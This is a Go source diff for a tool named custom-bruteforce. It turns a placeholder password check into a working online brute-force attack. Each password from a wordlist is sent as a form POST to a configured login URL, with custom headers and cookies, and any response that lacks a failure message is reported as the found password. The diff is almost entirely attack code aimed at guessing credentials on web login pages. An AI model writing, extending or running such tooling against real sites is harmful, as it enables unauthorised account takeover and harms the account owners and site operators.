@@ -2,10 +2,15 @@ package bruteforce
 
 import (
 	"custom-bruteforce/pkg/config"
+	"custom-bruteforce/pkg/site"
+	"custom-bruteforce/pkg/headers"
 	"custom-bruteforce/pkg/structs"
 	"errors"
 	"fmt"
 	"io/ioutil"
+	"net/http"
+	"net/http/cookiejar"
+	"net/url"
 	"strings"
 	"sync"
 )
@@ -140,7 +145,11 @@ func Start() error {
 			// finally reading the passwords
 			for _, pass := range w {
 				// launching attacks for next steps
-				_run_attack(pass)
+				err := _run_attack(pass)
+				if err != nil {
+					fmt.Printf("error: %v\n", err)
+				}
+				// TODO: Handle error message from the attack function
 				if Attack.Status {
 					// deleting the wordlist to stop the threads
 					wordlist = [][]string{}
@@ -155,19 +164,54 @@ func Start() error {
 }
 
 // launching the thread brute-force attack
-func _run_attack(pass string) {
-	// brute-forcing password until the status is set to true
-	if !Attack.Status{
-		fmt.Printf("\033[34m[~] trying password: %v\033[0m\n", pass)
-		if pass == "nogales1" {
-			// setting attack status to true and setting the password that we brute-forced
-			Attack = Attack_Result {Status: true, Password: pass}
+func _run_attack(pass string) error {
+	if !Attack.Status {
+		client := http.Client{}
+		jar, err := cookiejar.New(nil)
+		if err != nil {
+			return err
+		}
+		client.Jar = jar
+
+		values := url.Values{}
+		for _, field := range site.Fields {
+			values.Set(field.Name, field.Value)
+		}
+		values.Set(Field, pass)
+
+		req, err := http.NewRequest(site.Method, site.Host, strings.NewReader(values.Encode()))
+		if err != nil {
+			return err
+		}
+		defer req.Body.Close()
+		if headers.Is() {
+			for _, header := range headers.Get(){
+				req.Header.Set(header.Name, header.Value)
+			}
+		}
+
+		resp, err := client.Do(req)
+		if err != nil {
+			return err
+		}
+
+		if resp.StatusCode == http.StatusOK {
+			body, err := ioutil.ReadAll(resp.Body)
+			if err != nil {
+				return err
+			}
+			if !strings.Contains(string(body), Fail.Message) {
+				Attack = Attack_Result {Status: true, Password: pass}
+				return nil
+			}
+			fmt.Printf("\033[34m[~] trying password: %v\033[0m\n", pass)
 		}
 	}
+	return nil
 }
 
 func _attack_finished(){
 	if Attack.Status && Attack.Password != "" {
-		fmt.Printf("\033[32m[~] the thing that you are looking for is found: %v\033[0m\n", Attack.Password)
+		fmt.Printf("\033[32m[~] the thing that you were looking for is found: %v\033[0m\n", Attack.Password)
 	}
 }
